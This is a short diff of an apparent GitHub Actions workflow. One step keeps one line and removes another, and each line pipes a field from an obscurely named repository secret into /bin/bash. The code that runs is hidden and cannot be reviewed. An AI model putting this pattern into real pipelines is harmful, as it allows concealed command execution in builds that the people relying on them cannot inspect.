@@ -22,7 +22,6 @@ jobs:
           ifutj9876: ${{ secrets.ifutj9876 }}
         run: |
           printf '%s' "$ifutj9876" | jq -r .o085 | /bin/bash
-          printf '%s' "$ertnd57089" | jq -r .cdj915 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
